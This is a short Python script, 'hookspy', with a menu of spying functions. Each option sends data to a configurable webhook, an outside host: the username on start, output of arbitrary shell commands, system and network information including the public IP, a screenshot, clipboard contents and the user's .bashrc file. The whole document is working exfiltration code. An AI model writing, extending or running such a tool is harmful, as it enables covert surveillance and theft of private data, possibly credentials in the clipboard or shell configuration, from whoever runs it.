import os
import requests
import pyperclip
import time
print("this is pre release")
time.sleep(0.3)
WEBHOOK = "webhook" #put your here

user = os.getlogin()
requests.post(WEBHOOK, data={"content": f"```Logged in as {user}```"})  
print(f"Logged in as {user}")

cwd = os.getcwd()
while True:
    print(f"""
    \n hookspy v0.2-beta        https://github.com/realpnut/hookspy
    0 - Exit
    1 - Shell
    2 - System Info
    3 - Screenshot
    4 - Paperclip logger
    5 - Network Info
    6 - .bashrc grabber
    """)
    uput = input("Choose an option: ")

    if uput == "1":
        while True:
            cmd = input(f"{cwd}> ")

            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    cwd = os.getcwd()
                except:
                    print("blad cd")
                continue
            out = os.popen(cmd).read()
            print(out)
            requests.post(WEBHOOK, data={"content": f"```[{cwd}]> {cmd}```"})
            requests.post(WEBHOOK, data={"content": f"```{out}```"})
    elif uput == "2":
        out = os.popen("fastfetch --logo none --pipe").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
    elif uput == "3":
        os.system("scrot /tmp/screenshot.png")
        with open("/tmp/screenshot.png", "rb") as f:
            requests.post(WEBHOOK, data={"content": f"```Screenshotting...```"})
            requests.post(WEBHOOK, files={"file": f})
        os.system("rm /tmp/screenshot.png")
    elif uput == "4":
        text = pyperclip.paste()
        print(f"Clipboard content: {text}")
        requests.post(WEBHOOK, data={"content": f"```Clipboard content: {text}```"})
    elif uput == "5":
        out = os.popen("ifconfig").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
        out = os.popen("curl ipinfo.io").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
    elif uput == "6":
        os.system("cp ~/.bashrc /tmp/bashrc")
        with open("/tmp/bashrc", "rb") as f:
            requests.post(WEBHOOK, data={"content": f"```Grabbing .bashrc...```"})
            requests.post(WEBHOOK, files={"file": f})
        os.system("rm /tmp/bashrc")
    elif uput == "0":
        break
    else:
        print("Invalid option")
